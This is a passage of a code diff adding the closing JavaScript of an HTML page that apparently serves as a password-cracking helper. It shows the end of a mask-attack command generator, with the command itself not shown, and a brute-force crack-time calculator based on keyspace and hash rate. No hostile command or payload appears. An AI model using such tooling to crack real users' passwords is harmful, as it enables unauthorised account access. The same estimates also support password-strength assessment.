+  const out=document.getElementById('mask-output');
+  out.style.display='block';
+  out.innerHTML='<button class="btn btn-copy copy-gen" onclick="copyEl(\'mask-output\')">\uD83D\uDCCB Copy</button># Mask Attack\n'+cmd;
+}
+
+/* ═══════════════════════════════════════════════
+   TIME CALCULATOR
+   ═══════════════════════════════════════════════ */
+function calcTime(){
+  const charset=parseInt(document.getElementById('tc-charset').value);
+  const length=parseInt(document.getElementById('tc-length').value);
+  const rate=parseFloat(document.getElementById('tc-rate').value);
+  const keyspace=Math.pow(charset,length);
+  const seconds=keyspace/rate;
+  let timeStr='';
+  if(seconds<0.001) timeStr=(seconds*1000000).toFixed(2)+' microseconds';
+  else if(seconds<1) timeStr=(seconds*1000).toFixed(2)+' milliseconds';
+  else if(seconds<60) timeStr=seconds.toFixed(2)+' seconds';
+  else if(seconds<3600) timeStr=(seconds/60).toFixed(2)+' minutes';
+  else if(seconds<86400) timeStr=(seconds/3600).toFixed(2)+' hours';
+  else if(seconds<31536000) timeStr=(seconds/86400).toFixed(2)+' days';
+  else timeStr=(seconds/31536000).toFixed(2)+' years';
+  document.getElementById('tc-output').textContent='Charset: '+charset+' characters\nPassword Length: '+length+'\nKeyspace: '+keyspace.toLocaleString()+' combinations\nHash Rate: '+rate.toLocaleString()+' H/s\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u23F1 Estimated Crack Time: '+timeStr;
+}
+
+/* ═══════════════════════════════════════════════
+   INIT
+   ═══════════════════════════════════════════════ */
+document.addEventListener('DOMContentLoaded',()=>{
+  countPayloads();
+  if(document.getElementById('tc-charset')) calcTime();
+});
+</script>
+</body>
+</html>
